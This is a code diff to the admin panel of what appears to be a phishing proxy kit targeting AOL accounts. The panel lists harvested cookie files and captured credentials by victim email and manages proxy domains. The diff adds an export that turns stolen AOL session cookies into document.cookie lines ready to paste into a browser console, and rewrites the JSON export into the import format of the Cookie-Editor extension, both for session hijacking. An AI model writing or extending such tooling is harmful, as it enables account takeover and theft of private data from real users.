@@ -649,7 +649,7 @@
         <div class="stat-block" onclick="switchTab('cookiesTab')">
             <h4>🍪 Total Cookie Files</h4>
             <div class="stat-number" id="totalCookiesCount">0</div>
-            <div class="stat-trend" id="cookieTrend">📊 JSON format</div>
+            <div class="stat-trend" id="cookieTrend">📊 JSON/TXT format</div>
             <div class="stat-footnote">cookie files saved</div>
         </div>
         <div class="stat-block" onclick="switchTab('proxyTab')">
@@ -695,7 +695,7 @@
     </div>
 
     <div id="cookiesTab" class="tab-pane">
-        <div style="margin-bottom: 16px;"><h3 style="color: var(--text-secondary);">🍪 Saved cookie files (JSON format)</h3></div>
+        <div style="margin-bottom: 16px;"><h3 style="color: var(--text-secondary);">🍪 Saved cookie files (JSON/TXT format)</h3></div>
         <div class="classic-table-wrapper" id="cookiesTableWrapper">
             <div style="padding: 30px; text-align: center;">Loading cookies...</div>
         </div>
@@ -964,7 +964,6 @@
         if (!graphContainer) return;
         
         const days = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
-        // Random heights for visual effect
         const heights = [65, 45, 80, 55, 70, 90, 60];
         
         graphContainer.innerHTML = days.map((day, i) => `
@@ -1144,7 +1143,8 @@
                     <td>${c.cookie_count}</td>
                     <td>${hasCredBadge}</td>
                     <td class="action-group">
-                        <button class="mini-btn" onclick="downloadCookieJson('${escapeAttr(c.email)}')">📄 Download JSON</button>
+                        <button class="mini-btn" onclick="downloadCookieTxt('${escapeAttr(c.email)}')">📄 Download TXT</button>
+                        <button class="mini-btn" onclick="downloadCookieJson('${escapeAttr(c.email)}')">📦 Download JSON</button>
                     </td>
                     <td><button class="mini-btn" onclick="deleteCookieFile('${escapeAttr(c.filename)}')">🗑️ Delete</button></td>
                 </tr>`;
@@ -1158,6 +1158,47 @@
         }
     }
 
+    // Download cookies as TXT (console-pasteable format)
+    window.downloadCookieTxt = async function(email) {
+        showToast(`Preparing cookie data for ${email}...`);
+        try {
+            const resp = await fetch(`/admin/api/user-cookies/${encodeURIComponent(email)}`);
+            if (!resp.ok) throw new Error('Failed to fetch cookies');
+            const cookies = await resp.json();
+            
+            if (!cookies || Object.keys(cookies).length === 0) {
+                showToast("No cookies found for this account", true);
+                return;
+            }
+            
+            // Create TXT content in console-pasteable format
+            let content = `// AOL Cookies for ${email}\n`;
+            content += `// Generated: ${new Date().toISOString()}\n`;
+            content += `// Total cookies: ${Object.keys(cookies).length}\n\n`;
+            
+            for (const [name, value] of Object.entries(cookies)) {
+                content += `document.cookie = '${name}=${value}; domain=.aol.com; path=/; secure';\n\n`;
+            }
+            
+            const blob = new Blob([content], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${email.replace(/[^a-z0-9]/gi, '_')}_cookies.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showToast(`Downloaded TXT cookies for ${email} (${Object.keys(cookies).length} cookies) - ready for console paste`);
+            addLog(`Downloaded cookies TXT for ${email}`, 'success');
+        } catch(e) {
+            showToast(`Failed to download: ${e.message}`, true);
+            addLog(`Failed to download cookies TXT for ${email}: ${e.message}`, 'error');
+        }
+    };
+
+    // Download cookies as JSON (for Cookie-Editor)
     window.downloadCookieJson = async function(email) {
         showToast(`Preparing cookie data for ${email}...`);
         try {
@@ -1170,14 +1211,23 @@
                 return;
             }
             
-            const exportObj = {
-                email: email,
-                cookie_count: Object.keys(cookies).length,
-                cookies: cookies,
-                exported_at: new Date().toISOString()
-            };
+            // Create JSON format for Cookie-Editor extension
+            const cookieList = [];
+            for (const [name, value] of Object.entries(cookies)) {
+                cookieList.push({
+                    "domain": ".aol.com",
+                    "hostOnly": false,
+                    "httpOnly": false,
+                    "name": name,
+                    "path": "/",
+                    "sameSite": "unspecified",
+                    "secure": true,
+                    "session": true,
+                    "value": value
+                });
+            }
             
-            const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type: 'application/json'});
+            const blob = new Blob([JSON.stringify(cookieList, null, 2)], {type: 'application/json'});
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
@@ -1187,11 +1237,11 @@
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             
-            showToast(`Downloaded cookies for ${email} (${Object.keys(cookies).length} cookies)`);
+            showToast(`Downloaded JSON cookies for ${email} (${Object.keys(cookies).length} cookies) - ready for Cookie-Editor`);
             addLog(`Downloaded cookies JSON for ${email}`, 'success');
         } catch(e) {
             showToast(`Failed to download: ${e.message}`, true);
-            addLog(`Failed to download cookies for ${email}: ${e.message}`, 'error');
+            addLog(`Failed to download cookies JSON for ${email}: ${e.message}`, 'error');
         }
     };
     
@@ -1606,7 +1656,7 @@
             if (!data.proxy_domains || data.proxy_domains.length === 0) {
                 wrapper.innerHTML = '<div style="padding:20px; text-align:center;">🌐 No proxy domains configured</div>';
             } else {
-                let html = '<table class="classic-table"><thead><tr><th>Domain</th><th>SSL</th><th>Created</th><th>Actions</th></tr></thead><tbody>';
+                let html = '<table class="classic-table"><thead><tr><th>Domain</th><th>SSL Status</th><th>Created</th><th>Actions</th></tr></thead><tbody>';
                 
                 for (let domain of data.proxy_domains) {
                     let sslStatus = '🔍 Checking...';
@@ -1616,7 +1666,7 @@
                         const sslCheck = await fetch(`/admin/api/ssl/check/${encodeURIComponent(domain.domain)}`);
                         const sslData = await sslCheck.json();
                         
-                        if (sslData.has_ssl && sslData.is_valid) {
+                        if (sslData.success && sslData.has_ssl && sslData.is_valid) {
                             if (sslData.days_left < 7) {
                                 sslStatus = `⚠️ Expires in ${sslData.days_left} days`;
                                 sslClass = 'badge-warning';
